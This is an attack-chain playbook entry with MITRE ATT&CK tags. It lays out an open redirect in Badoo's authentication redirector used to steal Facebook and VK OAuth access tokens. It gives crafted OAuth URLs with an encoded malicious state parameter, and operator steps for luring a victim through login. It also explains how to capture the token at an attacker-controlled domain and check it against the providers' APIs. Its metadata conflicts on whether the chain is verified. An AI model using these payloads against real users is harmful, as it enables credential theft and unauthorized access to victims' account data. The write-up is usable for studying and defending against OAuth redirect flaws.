---
tags:
  - open-redirect
  - oauth-theft
  - facebook
  - vk
  - token-theft
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Credential Access]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Craft-and-Initiate-Facebook-OAuth-with-Malicious-Redirect]]'
  - '[[procedures/Complete-Authentication-and-Capture-Facebook-Token]]'
  - '[[procedures/Reproduce-Token-Theft-with-VK-OAuth]]'
step_count: 3
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[T1528.001]]'
updated_at: '2025-12-14T17:24:26.840Z'
description: >-
  Multi-stage attack exploiting an open redirect vulnerability in the Badoo
  authentication endpoint to steal OAuth access tokens from Facebook and VK
  integrations.
skill_level: intermediate
impact_level: high
id: 2ad00066-d364-4c5d-a775-e18550715c0e
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Credential Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[T1528.001]]'
---
# Open Redirect in Badoo Auth Endpoint to Steal Facebook and VK OAuth Tokens

Multi-stage attack chain demonstrating exploitation of an open redirect in the Badoo/Bumble authentication endpoint to intercept OAuth access tokens from Facebook and VK, enabling unauthorized access to victim account data.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initiate OAuth Flow with Crafted Redirect] --> B[Trigger Redirect and Token Exposure]
    B --> C[Capture Token from Attacker Domain]
    C --> D[Reproduce on Alternative Provider (VK)]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- Web browser (IE11 or Edge for optimal exploitation due to URL parsing quirks)
- URL encoder/decoder tool (e.g., base64 encoder)

### Target Environment

- Web platform
- Badoo/Bumble authentication services
- Facebook or VK OAuth integrations

### Initial Access Requirements

- Victim must authenticate with linked Facebook or VK account
- Attacker controls a domain (e.g., google.com/.attacker.com for misparsing)
- No prior credentials needed; social engineering to trick victim into clicking OAuth link

## Detailed Attack Procedures

### Step 1: Craft and Initiate Facebook OAuth Flow
procedure: [[procedures/Craft-and-Initiate-Facebook-OAuth-with-Malicious-Redirect]]

**Objective**: Start the OAuth flow using a malicious redirect_uri that exploits the open redirect to point to an attacker-controlled domain.

**Instructions**: Encode the malicious URL as base64 for the state parameter. The crafted URL uses a dot-appended domain like google.com/.badoo.com, which IE11/Edge parses as valid but redirects to the attacker's site.

Access the Facebook OAuth dialog with the following URL (replace with your encoded state):

```url
https://www.facebook.com/v2.2/dialog/oauth?response_type=token&display=popup&client_id=107433747809&redirect_uri=https%3A%2F%2Fbadoo.com%2Fexternal%2Fredirector.phtml%3fstate%3daHR0cHM6Ly93d3cuZ29vZ2xlLmNvbSUyZi5iYWRvby5jb20v
```

**Expected Output**: Facebook login dialog opens, prompting user authentication.

**Success Indicators**:
- OAuth dialog loads without errors
- User is prompted to link or authenticate Facebook account

### Step 2: Complete Authentication and Capture Token
procedure: [[procedures/Complete-Authentication-and-Capture-Facebook-Token]]

**Objective**: After authentication, trigger the redirect that appends the access_token to the attacker's domain URL, exposing it in the hash fragment.

**Instructions**: Have the victim complete the Facebook authentication. Upon success, Facebook redirects to the Badoo endpoint, which then redirects to the malicious URL with the token in the hash.

Monitor the redirect (e.g., via browser dev tools or attacker server logs):

```url
https://www.google.com/.badoo.com/#access_token=[user_access_token]&expires_in=[number]
```

**Expected Output**: Browser loads attacker's domain with token visible in URL hash; token can be extracted via JavaScript or logs.

**Success Indicators**:
- Redirect occurs to attacker-controlled domain
- Access token appears in URL hash
- Token can be used to query Facebook Graph API for user data

### Step 3: Reproduce with VK OAuth
procedure: [[procedures/Reproduce-Token-Theft-with-VK-OAuth]]

**Objective**: Apply the same open redirect technique to VK OAuth to steal VK access tokens.

**Instructions**: Use a similar crafted redirect_uri in the VK authorization URL. Encode the state parameter as before.

Access the VK OAuth URL:

```url
https://oauth.vk.com/authorize?response_type=token&display=popup&client_id=2396364&scope=email%2Cphotos&redirect_uri=https%3A%2F%2Fbadoo.com%2Fexternal%2Fredirector.phtml%3fstate%3DaHR0cHM6Ly93d3cuZ29vZ2xlLmNvbSUyZi5iYWRvby5jb20v
```

**Expected Output**: VK authentication completes, redirecting token to attacker domain.

**Success Indicators**:
- VK login dialog opens
- Token captured in hash fragment after redirect
- Token validates against VK API

## Attack Chain Summary

### Key Achievements

1. Bypassed URL validation in Badoo redirector using browser-specific parsing
2. Stole Facebook OAuth access_token, enabling data access and potential account compromise
3. Demonstrated portability to VK OAuth for broader impact

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[T1528.001]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Credential Access]]

---
*Last updated: 2023-10-01T00:00:00Z*
